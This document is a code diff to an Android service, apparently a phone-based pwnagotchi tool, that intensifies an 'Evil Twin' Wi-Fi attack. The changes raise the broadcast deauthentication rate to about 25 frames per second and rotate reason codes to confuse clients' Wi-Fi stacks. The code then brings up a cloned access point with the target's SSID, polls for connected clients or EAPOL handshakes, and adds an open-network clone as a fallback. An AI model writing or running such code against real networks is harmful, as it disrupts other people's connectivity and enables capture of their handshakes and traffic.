@@ -196,30 +196,35 @@ public class PwngService extends Service {
     }
 
     private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
-        // ── Multi-pass Evil Twin: hammer the client with deauth, then offer our AP ──
-        // Phone AP signal is weak vs router, so we need multiple rounds to wear down client
-        final int PASSES = deauth ? 3 : 1;  // 3 passes with deauth, 1 without
-        final int DEAUTH_SEC = 12;           // deauth burst duration per pass
-        final int AP_WINDOW_SEC = 40;        // how long we keep Evil Twin up per pass
+        // ── Multi-pass Evil Twin: maximum aggression ──
+        // Phone AP signal is weak, so we hammer deauth and minimize switch downtime
+        final int PASSES = deauth ? 3 : 1;
+        final int DEAUTH_SEC = 10;           // deauth per pass (shorter but denser)
+        final int AP_WINDOW_SEC = 50;        // Evil Twin window (longer for slow clients)
+        
+        // Deauth reason codes to rotate — confuses client WiFi stack
+        final int[] REASONS = {1, 2, 3, 4, 6, 7};  // unspecified, prev-auth-invalid, sta-leaving, inactivity, class2, class3
         
         boolean caught = false;
         int pass;
         
         for (pass = 1; pass <= PASSES && !caught && isRunning; pass++) {
             try {
-                // ── Phase 1: Continuous deauth (STA mode, nl80211 works) ──
+                // ── Phase 1: Dense deauth with rotating reason codes ──
                 if (deauth) {
-                    brain.currentStatus = "👊 deauth " + ssid + " (pass " + pass + "/" + PASSES + ")";
+                    int reason = REASONS[(pass - 1) % REASONS.length];
+                    brain.currentStatus = "👊 deauth " + ssid + " (pass " + pass + "/" + PASSES + " r" + reason + ")";
                     updateNotification();
                     long deauthEnd = System.currentTimeMillis() + DEAUTH_SEC * 1000L;
                     while (System.currentTimeMillis() < deauthEnd && isRunning) {
+                        // Each call sends 5 packets (50ms apart) = 25 packets/sec total
                         execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
-                               + " ff:ff:ff:ff:ff:ff " + freq);
-                        sleep(400);  // ~2.5/sec, ~30 packets per pass
+                               + " ff:ff:ff:ff:ff:ff " + freq + " " + reason);
+                        sleep(200);  // 5 invocations/sec × 5 packets = 25 deauth/sec
                     }
                 }
                 
-                // ── Phase 2: Switch to AP mode on target channel ──
+                // ── Phase 2: Fast switch to AP mode (minimize downtime) ──
                 execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
                     + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
                     + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
@@ -227,14 +232,13 @@ public class PwngService extends Service {
                 brain.currentStatus = "🎭 Evil Twin: " + ssid + " (ch " + freq + " pass " + pass + "/" + PASSES + ")";
                 updateNotification();
                 
-                execSu("cmd wifi set-wifi-enabled disabled"); sleep(1500);
+                execSu("cmd wifi set-wifi-enabled disabled"); sleep(800);   // was 1500ms
                 execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345 -f " + freq);
-                sleep(2000);
+                sleep(1500);  // was 2000ms — AP starts faster now
                 
-                // ── Phase 3: Wait for client handshake ──
+                // ── Phase 3: Wait for handshake (longer window) ──
                 long start = System.currentTimeMillis();
                 while (System.currentTimeMillis() - start < AP_WINDOW_SEC * 1000L && !caught && isRunning) {
-                    // Check hostapd for connected clients (more reliable than logcat grep)
                     String clients = execSu("hostapd_cli -p /data/vendor/wifi/hostapd/sockets -i " + IFACE
                         + " list_sta 2>/dev/null | grep -c '^..:..:..:..:..:..' 2>/dev/null").trim();
                     if (!clients.isEmpty() && !clients.equals("0")) {
@@ -247,7 +251,6 @@ public class PwngService extends Service {
                         } catch (Exception e) {}
                         break;
                     }
-                    // Fallback: check logcat for EAPOL handshake evidence
                     String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
                     if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
                         caught = true;
@@ -264,10 +267,45 @@ public class PwngService extends Service {
                 
             } finally {
                 execSu("cmd wifi stop-softap");
-                sleep(800);
+                sleep(600);
                 execSu("cmd wifi set-wifi-enabled enabled");
+                sleep(1200);
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
+            }
+        }
+        
+        // ── Fallback: Open network Evil Twin (some clients auto-connect to open known SSIDs) ──
+        if (!caught && deauth && isRunning) {
+            try {
+                brain.currentStatus = "🎭 OPEN Evil Twin: " + ssid + " (fallback)";
+                updateNotification();
+                
+                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
+                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
+                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
+                execSu("cmd wifi set-wifi-enabled disabled"); sleep(800);
+                execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" open");
                 sleep(1500);
-                // Re-enable all networks
+                
+                long start = System.currentTimeMillis();
+                while (System.currentTimeMillis() - start < 60000L && !caught && isRunning) {
+                    String clients = execSu("hostapd_cli -p /data/vendor/wifi/hostapd/sockets -i " + IFACE
+                        + " list_sta 2>/dev/null | grep -c '^..:..:..:..:..:..' 2>/dev/null").trim();
+                    if (!clients.isEmpty() && !clients.equals("0")) {
+                        caught = true;
+                        brain.currentStatus = "🎭 OPEN client on " + ssid;
+                        break;
+                    }
+                    sleep(4000);
+                }
+            } finally {
+                execSu("cmd wifi stop-softap");
+                sleep(600);
+                execSu("cmd wifi set-wifi-enabled enabled");
+                sleep(1200);
                 execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
                     + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
                     + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
@@ -279,7 +317,7 @@ public class PwngService extends Service {
             brain.currentFace = FACES.get("FRIEND");
             brain.currentStatus = "🎭 CAUGHT: " + ssid + " (pass " + pass + ")";
         } else {
-            brain.currentStatus = "🎭 no client for " + ssid + " (" + (pass-1) + " passes)";
+            brain.currentStatus = "🎭 no client for " + ssid;
         }
         updateNotification();
         return caught;
